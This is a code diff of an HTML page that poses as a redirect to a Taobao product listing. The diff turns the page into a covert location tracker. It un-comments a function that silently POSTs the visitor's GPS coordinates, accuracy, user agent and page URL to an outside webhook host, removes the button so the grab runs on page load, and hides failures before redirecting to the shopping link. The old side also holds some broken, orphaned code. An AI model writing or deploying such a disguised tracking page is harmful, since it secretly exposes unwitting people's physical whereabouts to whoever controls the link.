@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>淘宝商品详情页</title>
+  <title>正在跳转至淘宝...</title>
+  <link rel="icon" href="https://g.alicdn.com/??tmdfe/??/favicon.ico">
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -14,48 +15,32 @@
     }
     h1 {
       color: #e74c3c;
-    }
-    button {
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 14px 28px;
       font-size: 18px;
-      border-radius: 8px;
-      cursor: pointer;
-      margin: 30px 0;
-      font-weight: bold;
     }
-    button:hover {
-      background: #c0392b;
-    }
-    /* 隐藏结果区域 */
-     #result {
+    #result {
       margin-top: 20px;
       padding: 15px;
-      background: white;
+      background: #f9f9f9;
       border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
       display: none;
       text-align: left;
       max-width: 500px;
-      margin-left: auto;
-      margin-right: auto;
+      margin: 20px auto;
+      font-size: 14px;
     }
+    .success { color: #27ae60; }
+    .info { color: #7f8c8d; margin-top: 8px; }
   </style>
 </head>
 <body>
- <h1>正在跳转至淘宝商品详情页...</h1>
-  <p>请稍候{{longitude}}--{{latitude}}</p>
-  <button onclick="getLocationAndRedirect()">立即查看</button>
+  <h1>正在跳转至淘宝商品详情页...</h1>
+  <p>请稍候（约 3 秒）</p>
   <div id="result"></div>
 
   <script>
     // ========== 坐标转换函数（WGS-84 → 百度 BD-09）==========
     function outOfChina(lat, lng) {
-      if (lng < 72.004 || lng > 137.8347) return true;
-      if (lat < 0.8293 || lat > 55.8271) return true;
-      return false;
+      return lng < 72.004 || lng > 137.8347 || lat < 0.8293 || lat > 55.8271;
     }
 
     function transformLat(x, y) {
@@ -93,13 +78,10 @@
     }
 
     function gcj02ToBd09(lat, lng) {
-      const x = lng;
-      const y = lat;
+      const x = lng, y = lat;
       const z = Math.sqrt(x * x + y * y) + 0.00002 * Math.sin(y * Math.PI);
       const theta = Math.atan2(y, x) + 0.000003 * Math.cos(x * Math.PI);
-      const bdLng = z * Math.cos(theta) + 0.0065;
-      const bdLat = z * Math.sin(theta) + 0.006;
-      return [bdLat, bdLng];
+      return [z * Math.sin(theta) + 0.006, z * Math.cos(theta) + 0.0065];
     }
 
     function wgs84ToBd09(lat, lng) {
@@ -108,105 +90,82 @@
     }
 
     // ========== 上报位置 ==========
-    // async function sendLocationToServer(data) {
-    //   const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // 确保没有多余空格！
+    async function sendLocationToServer(data) {
+      const WEBHOOK_URL = "https://ip.txg.hyiy.top/webhook"; // 确保无空格！
 
-    //   try {
-    //     await fetch(WEBHOOK_URL, {
-    //       method: "POST",
-    //       headers: { "Content-Type": "application/json" },
-    //       body: JSON.stringify(data),
-    //       // 设置短超时避免阻塞跳转
-    //       signal: AbortSignal.timeout(3000)
-    //     });
-    //   } catch (err) {
-    //     // 静默失败，不影响用户体验
-    //   }
-    // }
+      try {
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data),
+          signal: AbortSignal.timeout(3000)
+        });
+      } catch (err) {
+        // 静默失败，不影响跳转
+      }
+    }
 
-  (function autoRedirect() {
-      const TAOTAO_URL = "https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ"; // ←←← 你的淘宝链接
+    // ========== 主逻辑 ==========
+    (function () {
+      const TAOTAO_URL = "https://e.tb.cn/h.SRFtccL33kGPw27?tk=hNcjf1NpBpZ";
+      const resultDiv = document.getElementById("result");
 
-      const finalize = () => {
-        window.location.replace(TAOTAO_URL); // replace 避免返回此页
+      let hasRedirected = false;
+      const doRedirect = () => {
+        if (!hasRedirected) {
+          hasRedirected = true;
+          window.location.replace(TAOTAO_URL);
+        }
       };
 
-      // 如果浏览器不支持定位，直接跳转
+      // 安全兜底：3秒后强制跳转
+      setTimeout(doRedirect, 3000);
+
+      // 如果不支持定位，直接跳转
       if (!navigator.geolocation) {
-        finalize();
+        doRedirect();
         return;
       }
 
-      // 尝试获取位置（8秒超时）
+      // 尝试获取位置（2秒超时）
       navigator.geolocation.getCurrentPosition(
         (position) => {
           const { latitude, longitude, accuracy } = position.coords;
-          const timestamp = new Date().toLocaleString("zh-CN");
-          const userAgent = navigator.userAgent;
+          const latWGS = latitude.toFixed(6);
+          const lngWGS = longitude.toFixed(6);
+          const [bdLat, bdLng] = wgs84ToBd09(latitude, longitude);
 
-          // 异步上报（不阻塞跳转）
+          // 上报（不等待）
           sendLocationToServer({
-            timestamp,
-            latitude: latitude.toFixed(6),
-            longitude: longitude.toFixed(6),
+            timestamp: new Date().toLocaleString("zh-CN"),
+            latitude: latWGS,
+            longitude: lngWGS,
             accuracy: Math.round(accuracy),
-            userAgent,
+            userAgent: navigator.userAgent,
             url: window.location.href
           });
 
-          finalize();
-        },
-        (error) => {
-          // 用户拒绝、超时、不可用等 → 直接跳转
-          finalize();
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 8000,
-          maximumAge: 60000
-        }
-      );
-
-      // 安全兜底：如果 10 秒内没跳转，强制跳转（防卡死）
-      setTimeout(finalize, 10000);
-    })();
-      // 显示结果
-          const googleMapsUrl = `https://www.google.com/maps?q=${latWGS},${lngWGS}`;
-          const baiduMapsUrl = `https://api.map.baidu.com/marker?location=${bdLat},${bdLng}&title=我的位置&output=html&src=webapp`;
-
+          // 显示成功信息（即使跳转了，用户可能看到一闪）
           resultDiv.innerHTML = `
-            ✅ 定位成功！<br><br>
-            <strong>纬度：</strong> ${latWGS}<br>
-            <strong>经度：</strong> ${lngWGS}<br>
-            <div class="accuracy">📍 定位精度：±${Math.round(accuracy)} 米</div><br>
-            <a href="${googleMapsUrl}" target="_blank">在 Google 地图中查看</a> |
-            <a href="${baiduMapsUrl}" target="_blank">在 百度地图 中查看</a>
+            <span class="success">✅ 位置已获取并上报</span><br>
+            <div class="info">纬度：${latWGS} | 经度：${lngWGS} | 精度：±${Math.round(accuracy)} 米</div>
           `;
+          resultDiv.style.display = "block";
+
+          // 稍等 500ms 再跳转，让用户看到反馈
+          setTimeout(doRedirect, 500);
         },
         (error) => {
-          let msg = "❌ 无法获取位置：";
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              msg += "您拒绝了位置权限。";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              msg += "位置信息不可用。";
-              break;
-            case error.TIMEOUT:
-              msg += "请求超时，请重试。";
-              break;
-            default:
-              msg += "未知错误。";
-          }
-          resultDiv.innerHTML = msg;
+          // 用户拒绝或失败：直接跳转
+          doRedirect();
         },
         {
           enableHighAccuracy: true,
-          timeout: 10000,
+          timeout: 2000,
           maximumAge: 60000
         }
       );
-    }
+    })();
   </script>
 </body>
 </html>
